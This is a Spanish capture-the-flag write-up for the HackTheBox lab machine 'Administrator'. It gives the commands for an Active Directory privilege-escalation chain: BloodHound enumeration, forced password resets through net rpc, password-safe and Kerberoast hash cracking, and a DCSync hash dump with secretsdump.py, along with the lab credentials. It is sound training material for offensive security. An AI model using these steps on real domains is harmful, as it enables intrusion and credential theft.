---
layout: default
---
![image](../../Imágenes%20Máquinas/ADMINISTRATOR.jpg)


# ADMINISTRATOR [HACKTHEBOX] / Medium
### (SMB Enumeration using NetExec, Listing Existing Users of the Domain, BloodHound-python Domain Dump, Use of Bloodound Docker for DC Enumeration, Abusing GenericAll Right to Change the User Password with Net RPC, Abusing ForceChangePassword to Change the User Password with Net RPC, FTP Enumeration, Password Safe Installation, Extracting the Hash from the PSafe3 with pwsafe2john, Cracking Hashes with JohnTheRipper, Credential Gathering Opening psafe3 file, Abusing GenericWrite Right with targetedKerberoast.py, Abusing GetChanges/GetChangesAll Privilege doing DCSync Attack with secretsdump.py)

#### - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

# Nmap Scan

Al hacer el escaneo de nmap, nos encontramos un montón de puertos abiertos, al observar esto, sumando que el TTL es de 127, podemos asumir que es una máquina Windows:

```bash
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-24 00:26:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55913/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55916/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
55921/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55924/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58927/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58959/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos muchos puertos abiertos, entre ellos están **LDAP**, **Kerberos**, **rpcclient**, **SMB** y **WinRM**, lo que nos hace pensar que es un Domain Controller (DC). Esto lo podemos comprobar ejecutando netexec con smb:

![image](../zimages/Pasted_image_20250423194019.png)

Vemos que tenemos el dominio `administrator.htb` y el nombre `DC`. Esto lo vamos a introducir en el `/etc/hosts` para que nos resuelva el nombre de dominio y no haya ningún problema. Esto se pone así para evitar problemas:

![image](../zimages/Pasted_image_20250423194259.png)

# SMB Enumeration

HackTheBox nos da unas credenciales (`Olivia:ichliebedich`) para saber si son correctas, podemos utilizar `netexec` y pasarlas por smb y por winrm, a ver que nos reporta. 

Como vemos, las credenciales son válidas y además nos podemos conectar a la máquina víctima utilizando `evil-winrm` (Pista: no hay nada interesante como este usuario):

![image](../zimages/Pasted_image_20250423201657.png)

Tenemos credenciales válidas de usuario, vamos a listar los recursos compartidos en el sistema para ver si hay algo interesante. Lo que vemos es que los permisos que tiene el usuario Olivia se parecen mucho a los de un DC:

![image](../zimages/Pasted_image_20250423202415.png)

Podemos hacer cosas como listar los usuarios:

```bash
netexec smb 10.10.11.42 -u Olivia -p ichliebedich
```

![image](../zimages/Pasted_image_20250423202445.png)

# BloodHound Enumeration

Vamos a utilizar bloodhound para que nos diga de que manera podemos ascender privilegios, para ello, necesitamos hacer un dumpeo de la información de la máquina, podemos utilizar varias herramientas, como `ldapdomaindump`, que nos dará una visión web bien organizada.

Yo en mi caso utilizaré `bloodhound-python`, que me lo descarga directamente en un .zip y es más cómodo:

```bash
bloodhound-python -u Olivia -p ichliebedich --zip -c All -ns 10.10.11.42 -d administrator.htb
```

Para Blodhound yo utilizo su versión de Docker, la cual podemos encontrar [aquí](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart), donde nos dan todas las instrucciones. Hay que estar atentos a la contraseña temporal que nos listar por terminal, ya que la necesitaremos para iniciar sesión después:

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

![image](../zimages/Pasted_image_20250423204126.png)

Con esto, nos vamos a localhost por el puerto 8080, metemos las credenciales temporales, nos creamos una contraseña nueva y estamos dentro de BloodHound.

Aquí nos tendremos que venir al apartado de subida de archivos llamado "File Ingest":

![image](../zimages/Pasted_image_20250423204423.png)

Donde tendremos que subir el archivo .zip que nos dumpeó `bloodhound-python`. Nos pondrá "Status: Ingesting", tendremos que esperar. Una vez lo ha configurado todo, nos podemos ir a "Explore" y empezar a investigar como podemos ascender privilegios.

Para esto, podemos directamente introducir el nombre de "Olivia" en "Search nodes":

![image](../zimages/Pasted_image_20250423204737.png)

## User: Michael (net rpc password change)

Para saber como ascender privilegios, nos iremos al panel de la derecha y seleccionaremos "Outbound Object Control", esto nos creará un link con otro usuario, en el que nos dirá como convertirnos en él:

![image](../zimages/Pasted_image_20250423204905.png)

Vemos que tenemos el permiso "GenericAll" sobre este usuario, vamos a clickar sobre ese permiso y nos iremos a "Linux Abuse" para saber como abusar de ello en Linux.

También nos explica que significa tener este permiso y que ataque podemos realizar:

![image](../zimages/Pasted_image_20250423205008.png)

Podemos hacer varios ataques, yo estaré abusando de "Force Change Password", ya que es el que va más al grano.

Bloodhound nos explica que en este ataque vamos a utilizar `net rpc` para realizar un cambio de contraseña la cual podremos cambiar por la que queramos:

```bash
net rpc password "UsuarioVíctima" "nuevaC@ntraseña2025" -U "DOMINIO"/"UsuarioControlado"%"Contraseña" -S "ControladorDominio"
```

![image](../zimages/Pasted_image_20250423205944.png)

## User: Benjamin (net rpc password change)

Ahora que ya nos hemos convertido en Michael, vamos a hacer la misma operativa con el siguiente usuario, "Benjamin":

![image](../zimages/Pasted_image_20250423210105.png)

Volvemos a cambiar la contraseña mediante `net rpc` y nos convertimos en el próximo usuario. Vemos que la contraseña es válida, pero solo al conectarnos por smb, esto es porque Benjamin no está en el grupo "Remote Management Users". 

Aun así, la contraseña es válida:

![image](../zimages/Pasted_image_20250423210340.png)

# User Flag (emily)

Con el usuario Benjamin no podemos obtener una shell, pero podemos entrar en ftp, donde vemos un archivo de contraseñas:

![image](../zimages/Pasted_image_20250423210835.png)

Al descargarnos el archivo e intentar acceder a él mediante el programa "passwordsafe", yo no lo tenía en mi máquina, así que lo descargué mediante `apt install passwordsafe`.

Al ser un archivo del cual necesitamos crackear una contraseña, podemos pensar en JohnTheRipper, si buscamos los paquetes de john a ver si alguno sirve para sacar el hash de un archivo ".psafe3", nos da buenos resultados:

![image](../zimages/Pasted_image_20250423211851.png)

Esto nos saca un hash de la contraseña, el cual intentaremos crackear con john. Funciona y nos saca una contraseña:

![image](../zimages/Pasted_image_20250423212052.png)

Al probar todas las credenciales para cada usuario con `netexec smb`, vemos que solo funciona la del usuario "emily", winrm también es válido con este usuario:

![image](../zimages/Pasted_image_20250423213932.png)

Vamos a intentar conectarnos mediante evil-winrm utilizando a emily como usuario:

```bash
evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

Y tenemos la flag de user:

![image](../zimages/Pasted_image_20250423214225.png)


# PrivEsc to Administrator (Root Flag)

## User: Ethan (targetedKerberoast.py)

Ahora ya nos podemos salir. Vamos a irnos otra vez a BloodHound, esta vez buscaremos al usuario emily y nos volveremos a ir a "Outbound Object Control", donde nos encontraremos al usuario "Ethan", del cual, siendo emily, tenemos el derecho "GenericWrite" sobre Ethan:

![image](../zimages/Pasted_image_20250423220405.png)

Pinchamos en el permiso, nos vamos a "Linux Abuse" y vemos que podemos hacer un "targetedKerberoast Attack".

Nos podemos clonar el repositorio oficial en nuestra máquina y ejecutar el siguiente comando (link en el BloodHound):

```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

Hay que realizar un `ntpdate [ip]`, ya que si no no funciona. Una vez repetido el comando con el reloj bien configurado, nos saca un hash:

![image](../zimages/Pasted_image_20250423222557.png)

El cual podemos crackear con `john`:

![image](../zimages/Pasted_image_20250423222649.png)

Una vez tenemos la contraseña, probamos en smb a ver si funciona y nos la da como correcta.

## User: Administrator (DCSync Attack)

Para el siguiente paso, nos volveremos al BloodHound y miramos el "Outboun Object Control" de Ethan, el cual vemos que es Administrator:

![image](../zimages/Pasted_image_20250423222851.png)

En mi caso, voy a pinchar en el derecho "GetChanges", el cual nos dice que podemos realizar un "DCSync Attack" para obtener el hash de Administrator utilizando `secretsdump.py`.

Este comando nos dumpea los hashes de todos los usuarios del dominio, incluyendo el de Administrator:

```bash
secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'10.10.11.42'
```

![image](../zimages/Pasted_image_20250423223903.png)

De ese output, nos copiamos el NTHash de "Administrator" y lo probamos con netexec:

![image](../zimages/Pasted_image_20250423224131.png)

Por último, nos conectamos mediante `Evil-Winrm`, nos vamos a `C:\Users\Administrator\Desktop` y ya tendríamos la flag de Administrator:

![image](../zimages/Pasted_image_20250423224313.png)


# ./PWNED

